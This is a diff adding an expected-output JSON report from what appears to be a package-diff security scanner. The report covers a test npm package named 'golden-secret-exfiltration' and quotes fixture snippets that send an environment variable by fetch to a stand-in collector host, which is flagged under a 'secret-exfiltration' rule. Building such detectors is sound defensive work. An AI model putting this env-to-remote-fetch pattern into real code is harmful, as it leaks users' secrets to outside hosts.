@@ -1,0 +1,112 @@
+{
+  "schemaVersion": 5,
+  "package": {
+    "ecosystem": "npm",
+    "name": "golden-secret-exfiltration",
+    "oldVersion": "1.0.0",
+    "newVersion": "2.0.0",
+    "newPackage": false
+  },
+  "reportId": "capdelta-cae0a39f085a12c65a68",
+  "summary": {
+    "findings": 3,
+    "capabilityFindings": 2,
+    "signalFindings": 1,
+    "diagnostics": 0,
+    "bySeverity": {
+      "CRITICAL": 2,
+      "HIGH": 1,
+      "MEDIUM": 0,
+      "LOW": 0,
+      "INFO": 0
+    }
+  },
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "change": "added",
+      "capability": {
+        "kind": "ENV",
+        "location": {
+          "kind": "runtime"
+        },
+        "evidence": [
+          {
+            "file": "index.js",
+            "line": 5,
+            "snippet": "body: process.env.CAPDELTA_FIXTURE_VALUE ?? \"\","
+          }
+        ]
+      },
+      "previous": null
+    },
+    {
+      "severity": "CRITICAL",
+      "change": "added",
+      "capability": {
+        "kind": "NET",
+        "location": {
+          "kind": "runtime"
+        },
+        "evidence": [
+          {
+            "file": "index.js",
+            "line": 3,
+            "snippet": "return fetch(\"https://collector.example.test/ingest\", {"
+          }
+        ]
+      },
+      "previous": null
+    }
+  ],
+  "signalFindings": [
+    {
+      "kind": "new-external-endpoint",
+      "severity": "HIGH",
+      "change": "added",
+      "detail": "new external domain collector.example.test",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 3,
+          "snippet": "return fetch(\"https://collector.example.test/ingest\", {"
+        }
+      ]
+    }
+  ],
+  "shapes": [
+    {
+      "ruleId": "secret-exfiltration",
+      "severity": "CRITICAL",
+      "capabilities": [
+        {
+          "kind": "NET",
+          "location": {
+            "kind": "runtime"
+          },
+          "evidence": [
+            {
+              "file": "index.js",
+              "line": 3,
+              "snippet": "return fetch(\"https://collector.example.test/ingest\", {"
+            }
+          ]
+        },
+        {
+          "kind": "ENV",
+          "location": {
+            "kind": "runtime"
+          },
+          "evidence": [
+            {
+              "file": "index.js",
+              "line": 5,
+              "snippet": "body: process.env.CAPDELTA_FIXTURE_VALUE ?? \"\","
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "diagnostics": []
+}
